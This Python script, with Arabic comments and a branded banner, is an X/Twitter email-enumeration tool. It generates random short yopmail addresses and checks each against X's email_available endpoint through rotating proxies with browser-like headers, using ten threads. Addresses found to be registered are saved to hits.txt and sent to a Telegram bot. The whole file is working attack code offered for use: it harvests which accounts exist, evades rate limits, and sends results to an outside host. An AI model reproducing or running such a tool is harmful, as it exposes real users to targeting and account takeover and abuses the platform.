from datetime import datetime
import sys
import time
import requests
import json
import random
from threading import Thread
import os

# الألوان - تم تغيير الأحمر إلى الأخضر
G = "\033[1;32m"  # أخضر ساطع
R = "\033[1;31m"  # أحمر (تم الاحتفاظ به للخطأ)
W = "\x1b[38;5;15m"  # أبيض
X = "\033[0m"  # إعادة تعيين اللون
Y = "\033[1;33m"  # أصفر

SEP = "━━━━━━━━━━━━━━━━━━"

p = f"{G}<[{W}●{G}]>{W}"
xp = f"{G}[{W}•{G}]{W}"
xpxx = f"{G}>{W}>{G}>{W}"

hits = 0
bad = 0
total = 0
good = 0
is_running = True
proxies = []
token = ""
chat_id = ""

version = '2.0'
__date__ = datetime.now().strftime("%Y-%m-%d")

logo = f"""
{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
{G}⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
{G}⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
{G}⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
{G}⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
{G}⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
{G}⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
{G}⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
{G}⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
{G}⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
{G}⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
{G}╭━━━┳━━━╮
{G}┃╭━╮┃╭━╮┃
{G}┃╰━╯┃╰━━╮
{G}┃╭━━┻━━╮┃
{G}┃┃╱╱┃╰━╯┃
{G}╰╯╱╱╰━━━╯
{SEP}
{W}  DEVELOPER {xpxx} PS{G}-{W}
{W}  STATUS    {xpxx} Premium
{W}  VERSION   {xpxx} V{G}/{W}{version}
{SEP}
{G}⫷⫸ 𝐃𝐄𝐕 𝑃𝑆 | @p7s7s ⫷⫸
{SEP}
{xp} FUTURES  {xpxx} FILE{G}〤{W}CLONE
{xp} DEV {xpxx} PS ~ p7s7s
{xp} TODAYS   {xpxx} {__date__}
{SEP}"""

def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')

def banner():
    clear_screen()
    print(logo)

def update_stats():
    # استخدام \r للرجوع إلى بداية السطر وتحديث الأرقام فقط
    sys.stdout.write(f"\r{SEP}\n")
    sys.stdout.write(f"{W}  HITS  {xpxx} {G}{hits}\n")
    sys.stdout.write(f"{W}  BAD   {xpxx} {R}{bad}\n")
    sys.stdout.write(f"{W}  TOTAL {xpxx} {Y}{total}\n")
    sys.stdout.write(f"{W}  GOOD  {xpxx} {G}{good}\n")
    sys.stdout.write(f"{SEP}\n")
    sys.stdout.flush()

def load_proxies(path):
    global proxies
    try:
        with open(path, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        print(f"{G}[+] LOADED {len(proxies)} PROXIES{X}")
        return True
    except:
        print(f"{R}[-] FAILED TO LOAD PROXIES{X}")
        return False

def gen_email():
    chars = 'qwertyuiopasdfghjklzxcvbnm0123456789'
    length = random.choice([3, 4])
    return ''.join(random.choice(chars) for _ in range(length)) + '@yopmail.com'

def send_tg(email):
    try:
        msg = f"""TWITTER SCANNER
━━━━━━━━━━━━━━━━━━
EMAIL: {email}
━━━━━━━━━━━━━━━━━━
BY: @p7s7s ~ t.me/ali313eme"""
        requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={msg}", timeout=5)
    except:
        pass

def check(email):
    global hits, bad, total, good
    try:
        proxy = {'http': random.choice(proxies)} if proxies else None
        headers = {
            'accept': '*/*',
            'origin': 'https://x.com',
            'referer': 'https://x.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        r = requests.get(
            'https://api.x.com/i/users/email_available.json',
            params={'email': email},
            headers=headers,
            proxies=proxy,
            timeout=3
        )
        total += 1
        if '"taken":true' in r.text:
            hits += 1
            good += 1
            with open('hits.txt', 'a') as f:
                f.write(f"{email}\n")
            print(f"{G}[+] HIT: {email}{X}")
            send_tg(email)
        else:
            bad += 1
            print(f"{G}PY: @p7s7s ")  # تغيير اللون من R إلى G
        update_stats()
    except:
        bad += 1
        update_stats()

def scanner():
    while is_running:
        check(gen_email())
        time.sleep(0.3)

if __name__ == "__main__":
    banner()
    token = input(f"{G}[?] ENTER TOKEN: {X}")
    chat_id = input(f"{G}[?] ENTER CHAT ID: {X}")
    
    use_proxy = input(f"{G}[?] DO YOU HAVE PROXIES? (Y/N): {X}").strip().lower()
    
    if use_proxy == 'y':
        proxy_path = input(f"{G}[?] ENTER PROXY FILE PATH: {X}")
        if not load_proxies(proxy_path):
            sys.exit(1)
    else:
        print(f"{Y}[!] RUNNING WITHOUT PROXIES{X}")
        proxies = []
    
    # عرض البانر والإحصائيات مرة واحدة
    banner()
    update_stats()
    print(f"{G}[*] STARTING SCANNER...{X}")
    
    for _ in range(10):
        Thread(target=scanner, daemon=True).start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        is_running = False
        print(f"\n{G}[!] STOPPED.{X}")  # تغيير اللون من R إلى G